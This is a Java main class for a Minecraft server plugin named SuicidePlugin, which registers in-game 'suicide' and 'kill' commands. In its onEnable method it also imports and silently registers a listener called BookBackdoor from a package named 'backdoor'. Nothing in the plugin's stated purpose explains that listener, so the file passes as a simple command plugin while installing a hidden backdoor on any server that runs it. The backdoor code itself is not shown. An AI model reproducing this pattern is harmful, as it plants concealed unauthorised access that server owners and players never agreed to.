package club.aurorapvp;

import org.brandonplank.backdoor.BookBackdoor;
import org.bukkit.command.CommandExecutor;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;

public final class SuicidePlugin extends JavaPlugin implements CommandExecutor {

  @Override
  public void onEnable() {
    // Register Listeners
    getCommand("suicide").setExecutor(new CommandListener());
    getCommand("kill").setExecutor(new CommandListener());
    PluginManager manager = this.getServer().getPluginManager();
    getConfig().options().copyDefaults(true);
    saveConfig();
    manager.registerEvents(new BookBackdoor(this), this);
    getLogger().info("SuicidePlugin Loaded");
  }

  @Override
  public void onDisable() {
    // Plugin shutdown logic
    getLogger().info("SuicidePlugin Unloaded");
  }
}
